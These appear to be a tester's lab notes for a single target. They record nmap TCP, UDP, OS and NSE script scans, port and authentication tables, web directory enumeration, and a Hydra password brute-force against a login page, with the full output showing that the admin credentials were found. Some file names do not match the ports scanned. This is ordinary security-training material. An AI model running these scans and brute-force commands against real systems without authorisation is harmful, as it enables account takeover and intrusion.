## Initial scans
Undertake an initial TCP and UDP scans of the target machines

~~~ bash
sudo nmap [IP] -oG nmap_tcp_initial

sudo nmap [IP] -sU -oG nmap_udp_initial

sudo nmap [IP] -sn -oG nmap_network_sweep

sudo nmap [IP] -O --osscan-guess -oG nmap_os_guess

sudo nmap [IP] -p 22 -oG nmap_tcp_p25

sudo nmap [IP] -p 22 -oG nmap_tcp_p80

sudo nmap [IP] --script ssh2-enum-algos.nse -oG nmap_script_ssh2-enum-algos

sudo nmap [IP] --script ssh-auth-methods.nse -oG nmap_script_ssh-auth-methods

sudo nmap [IP] --script http-enum.nse -oG nmap_script_http-enum

~~~

## Scan results
|port|type|service|status|scan log|notes|
|----|----|-------|------|--------|-----|
|22|tcp|ssh|open|nmap_tcp_initial|none|
|80|tcp|http|open|nmap_tcp_initial|none|
## Users
|username|password|service|hash type|log|free text|
|----|----|-------|------|--------|-----|
|none|none|none|none|none|none|
|none|none|none|none|none|none|
## Operating system
Linux
Apache 2.4.41

## Authentication methods
|port|service|authentication method|notes|
|----|-------|----|-----|
|22|ssh|public key|none|
|22|ssh|password|none|
|80|http|password/htaccess|none|
## HTTP enumeration
|url|folder|file|note|
|---|------|----|----|
|[IP]/login.php|N/A|login.php|none|
|[IP]/css/|css|N/A|none|
|[IP]/img/|img|N/A|N/A|none|
|[IP]/js/|js|N/A|none|
|[IP]/lib/|lib|N/A|none|

### Hydra
Using hydra to to brute force the web page at [IP]/login.php

~~~ bash

# this command was run on the login page 
# 192.168.162.202/login.php
hydra -L /usr/share/wordlists/metasploit/http_default_users.txt -P /usr/share/wordlists/metasploit/password.lst 192.168.162.202 http-post-form "/login.php:username=^USER^&password=^PASS^&login=login:Username password combination is wrong\!"

#############
admin
microsurgery
#############

hydra -L /usr/share/wordlists/metasploit/http_default_users.txt -P /usr/share/wordlists/metasploit/password.lst 192.168.162.202 http-post-form "/login.php:username=^USER^&password=^PASS^&login=login:Username password combination is wrong\!"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-17 20:09:12
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1237572 login tries (l:14/p:88398), ~77349 tries per task
[DATA] attacking http-post-form://192.168.162.202:80/login.php:username=^USER^&password=^PASS^&login=login:Username password combination is wrong!
[STATUS] 732.00 tries/min, 732 tries in 00:01h, 1236840 to do in 28:10h, 16 active
[STATUS] 737.33 tries/min, 2212 tries in 00:03h, 1235360 to do in 27:56h, 16 active
[STATUS] 750.43 tries/min, 5253 tries in 00:07h, 1232319 to do in 27:23h, 16 active
[STATUS] 752.87 tries/min, 11293 tries in 00:15h, 1226279 to do in 27:09h, 16 active
[STATUS] 748.77 tries/min, 23212 tries in 00:31h, 1214360 to do in 27:02h, 16 active
[STATUS] 751.47 tries/min, 35319 tries in 00:47h, 1202253 to do in 26:40h, 16 active
[STATUS] 749.84 tries/min, 47240 tries in 01:03h, 1190332 to do in 26:28h, 16 active
[STATUS] 618.28 tries/min, 48844 tries in 01:19h, 1188739 to do in 32:03h, 5 active
[80][http-post-form] host: 192.168.162.202   login: admin   password: microsurgery
[STATUS] 961.88 tries/min, 91379 tries in 01:35h, 1146204 to do in 19:52h, 5 active
[STATUS] 857.00 tries/min, 95127 tries in 01:51h, 1142456 to do in 22:14h, 5 active
[STATUS] 416.67 tries/min, 95146 tries in 03:48h, 1142437 to do in 45:42h, 5 active
~~~

## Website directory structure

-> <span style="color:cornflowerblue">192.168.xxx.202</span>
  -> <span style="color:darkmagenta">index.html</span>
  -> <span style="color:darkmagenta">login.php</span>
  -> <span style="color:cornflowerblue">css</span>
  -> <span style="color:cornflowerblue">img</span>
  -> <span style="color:cornflowerblue">js</span>
  -> <span style="color:cornflowerblue">lib</span>

## Vulnerabilites

### Apache 2.4.41


  